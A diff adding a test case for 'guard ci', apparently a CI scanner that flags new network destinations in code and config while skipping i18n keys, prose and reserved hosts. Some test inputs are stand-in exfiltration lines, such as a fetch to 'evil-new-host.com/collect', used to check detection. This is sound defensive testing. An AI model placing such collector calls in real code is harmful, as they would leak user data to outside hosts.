@@ -233,3 +233,54 @@ test('guard ci: an HTML page is code, so a destination it adds is reported; Mark
   const r = scanLines([{ file: 'public/checkout.html', line: 3, text }, { file: 'site/pay.htm', line: 1, text }, { file: 'README.md', line: 1, text }], p);
   assert.deepEqual(r.findings, [{ file: 'public/checkout.html', line: 3, host: 'collect.evil-pay.io' }, { file: 'site/pay.htm', line: 1, host: 'collect.evil-pay.io' }]);
 });
+
+test('guard ci (0.15.0): i18n keys and dotted identifiers are not hosts; URLs always are; a bare host only as the whole value of a host-like key', async () => {
+  const { hostsInLine, scanLines, bareHost, hostLikeKey, PUBLIC_SUFFIXES } = await import('../bin/lib/guard-ci.mjs');
+  const { parsePolicy } = await import('../bin/lib/guard.mjs');
+  // The strings `trooth guard ci` reported as hosts on the trooth.co repository before 0.15.0.
+  for (const k of ['page.docs.cli.guardTitle', 'lib.changelog.e2026.name', 'x.open', 'y.next', 'z.link']) {
+    for (const line of [`t("${k}")`, `"${k}": "Guard"`, `const label = '${k}';`, `{ key: "${k}" }`, `url: "${k}"`, `host: ${k}`]) {
+      assert.deepEqual(hostsInLine(line, 'app/page.tsx'), [], `${line} in code`);
+      assert.deepEqual(hostsInLine(line, 'messages/en.json'), [], `${line} in JSON`);
+    }
+  }
+  assert.deepEqual(hostsInLine('"page.docs.cli"', 'messages/en.json'), []);
+  assert.deepEqual(hostsInLine('t("page.docs.cli")', 'app/page.tsx'), []);
+  // Rule (a): the host of an http(s) or ws(s) URL, always, whatever its last label.
+  assert.deepEqual(hostsInLine('fetch("https://evil-new-host.com/collect")', 'src/a.js'), ['evil-new-host.com']);
+  assert.deepEqual(hostsInLine('const s = new WebSocket("wss://stream.vendor.link/x");', 'src/a.ts'), ['stream.vendor.link']);
+  assert.deepEqual(hostsInLine('fetch(`https://${host}/x`)', 'src/a.js'), []);
+  // Rule (b): the whole value of a host-like key, in YAML, JSON, TOML, .env, a JS object, a flag.
+  assert.deepEqual(hostsInLine('host: api.vendor.io', 'config.yaml'), ['api.vendor.io']);
+  assert.deepEqual(hostsInLine('  "endpoint": "api.vendor.io",', 'config.json'), ['api.vendor.io']);
+  assert.deepEqual(hostsInLine('hostname = "api.vendor.io"', 'config.toml'), ['api.vendor.io']);
+  assert.deepEqual(hostsInLine('PAYMENTS_API_HOST=api.vendor.io', '.env'), ['api.vendor.io']);
+  assert.deepEqual(hostsInLine('const client = create({ baseURL: "api.vendor.io", timeout: 5 });', 'src/a.ts'), ['api.vendor.io']);
+  assert.deepEqual(hostsInLine('webhook_host: hooks.newvendor.com # added', 'config.yaml'), ['hooks.newvendor.com']);
+  assert.deepEqual(hostsInLine('run: curl --host api.vendor.io', '.github/workflows/x.yml'), ['api.vendor.io']);
+  assert.deepEqual(hostsInLine('host: api.vendor.io:8443', 'config.yaml'), ['api.vendor.io']);
+  // Not a host: a key that is not host-like, a value that is not the whole value, an
+  // unquoted expression in code, camelCase, underscores, one label, a suffix not in the list.
+  assert.deepEqual(hostsInLine('title: api.vendor.io', 'config.yaml'), []);
+  assert.deepEqual(hostsInLine('host: api.vendor.io/v1', 'config.yaml'), []);
+  assert.deepEqual(hostsInLine('sendMail({ to: msg.to, from: ws.me });', 'src/a.ts'), []);
+  assert.deepEqual(hostsInLine('host: Api.Vendor.io', 'config.yaml'), []);
+  assert.deepEqual(hostsInLine('host: api_vendor.io', 'config.yaml'), []);
+  assert.deepEqual(hostsInLine('host: vendor', 'config.yaml'), []);
+  assert.deepEqual(hostsInLine('host: config.host', 'config.yaml'), []);
+  assert.deepEqual(hostsInLine('to: user.email', 'config.yaml'), []);
+  assert.deepEqual(hostsInLine('const LABEL = "api.vendor.io";', 'src/a.js'), [], 'a quoted dotted string under a key that is not host-like is not a destination');
+  assert.deepEqual(hostsInLine('const API = "api.vendor.io";', 'src/a.js'), ['api.vendor.io'], 'api is a host-like name');
+  // Still skipped: reserved names, localhost, IP literals.
+  for (const v of ['localhost', 'api.example.com', 'svc.internal', 'db.test', '10.0.0.1', '127.0.0.1']) assert.deepEqual(hostsInLine(`host: ${v}`, 'config.yaml'), [], v);
+  assert.deepEqual(hostsInLine('url: http://10.0.0.1:8080/x and https://localhost/ and https://example.com/', 'config.yaml'), []);
+  assert.equal(bareHost('api.vendor.io'), 'api.vendor.io');
+  assert.equal(bareHost('x.open'), null);
+  assert.equal(hostLikeKey('API_BASE_URL'), true); assert.equal(hostLikeKey('baseURL'), true); assert.equal(hostLikeKey('label'), false);
+  for (const s of ['com', 'net', 'org', 'io', 'co', 'ai', 'dev', 'app', 'uk', 'de', 'to']) assert.ok(PUBLIC_SUFFIXES.has(s), s);
+  for (const s of ['name', 'link', 'open', 'next', 'cli']) assert.ok(!PUBLIC_SUFFIXES.has(s), s);
+  // Prose stays prose: a URL in Markdown or a text file is not read.
+  const p = parsePolicy(POLICY_YAML);
+  const r = scanLines([{ file: 'docs/x.md', line: 1, text: 'See https://evil-new-host.com/collect' }, { file: 'NOTES.txt', line: 1, text: 'host: api.vendor.io' }, { file: 'src/a.js', line: 7, text: 'fetch("https://evil-new-host.com/collect")' }], p);
+  assert.deepEqual(r.findings, [{ file: 'src/a.js', line: 7, host: 'evil-new-host.com' }]);
+});
